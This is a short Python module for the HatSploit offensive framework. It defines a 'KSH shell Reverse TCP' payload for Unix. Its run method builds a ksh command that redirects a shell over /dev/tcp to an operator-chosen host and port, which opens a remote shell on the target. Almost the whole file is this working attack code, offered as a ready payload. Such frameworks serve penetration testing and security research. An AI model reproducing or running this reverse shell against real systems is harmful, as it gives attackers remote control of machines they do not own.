"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "KSH shell Reverse TCP",
            'Payload': "unix/generic/ksh_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "KSH shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def run(self):
        payload = f"ksh -c 'ksh >/dev/tcp/{self.rhost.value}/{self.rport.value} 2>&1 <&1'"
        return payload
